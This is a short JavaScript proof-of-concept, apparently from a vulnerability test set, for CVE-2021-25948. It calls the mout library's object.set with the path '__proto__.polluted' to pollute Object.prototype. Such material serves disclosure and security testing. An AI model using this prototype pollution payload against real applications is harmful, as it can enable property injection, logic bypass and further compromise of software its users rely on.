//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
 
  var mout = require("mout");
  var obj = {};

   

  mout.object.set.__x_toTaint = true;
  mout.object.set(obj, "__proto__.polluted", "yes");
// End of file
